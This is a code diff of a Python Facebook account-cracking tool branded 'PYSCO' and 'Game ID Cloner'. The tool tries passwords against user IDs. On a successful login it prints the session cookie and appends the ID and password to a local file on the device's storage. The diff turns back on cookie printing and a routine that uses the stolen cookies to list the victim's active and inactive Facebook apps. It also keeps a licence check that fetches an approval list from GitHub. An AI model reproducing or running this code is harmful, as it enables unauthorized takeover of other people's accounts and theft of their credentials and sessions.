@@ -254,8 +254,8 @@ def banner():
 \033[1;37m│ [+] AUTHOR   : MOHAMMAD JOBAID        │ 
 \033[1;37m│ [+] AUTHOR   : MOHAMMAD FARHAN        │ 
 \033[1;37m│ [+] GITHUB   : PYSCO-XD               |
-\033[1;37m│ [+] TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
-\033[1;37m│ [+] VERSION  : \033[1;35m 4\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
+\033[1;37m│ [+] TOOLS    : \033[1;32mPREMIUM  \033[1;37m       │
+\033[1;37m│ [+] VERSION  :  \033[1;32m0.3  \033[1;37m          │
 \033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
 #---------------------[LOOP MENU]---------------------#
 loop = 0
@@ -278,8 +278,8 @@ def cek_apk(session,coki):
         print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
         for i in range(len(game)):
             print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+        else:
+            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -749,8 +749,8 @@ def mix(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\033[1;92m '+uid+' | '+ps+'\33[0;92m')
-                #print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
-                #cek_apk(session,coki)
+                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
+                cek_apk(session,coki)
                 oks.append(cid)
                 open('/sdcard/RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                 break
@@ -813,7 +813,7 @@ def fcrack(uid,pwx,tl):
                 cid = coki[65:80]
                 print(f'\033[1;92m [PYSCO~OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
-                #cek_apk(session,coki)
+                cek_apk(session,coki)
                 oks.append(cid)
                 open('/sdcard/RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                 break
@@ -876,7 +876,7 @@ def fcrack1(uid,pwx,tl):
                 cid = coki[65:80]
                 print(f'\033[1;92m [PYSCO~OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
-                #cek_apk(session,coki)
+                cek_apk(session,coki)
                 oks.append(cid)
                 open('/sdcard/RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                
@@ -941,7 +941,7 @@ def fcrack2(uid,pwx,tl):
                 cid = coki[65:80]
                 print(f'\033[1;92m  [PYSCO~OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
-               #cek_apk(session,coki)
+                cek_apk(session,coki)
                 oks.append(cid)
                 open('/sdcard/RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                
@@ -960,7 +960,7 @@ def superuser():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
-    DARK=requests.get("https://raw.githubusercontent.com/JOBAID-XD/Game-cloner/main/Approval.txt").text
+    DARK = requests.get("https://raw.githubusercontent.com/JOBAID-XD/Game-cloner/main/Approval.txt").text
     if id in DARK:
         Main()
     else:
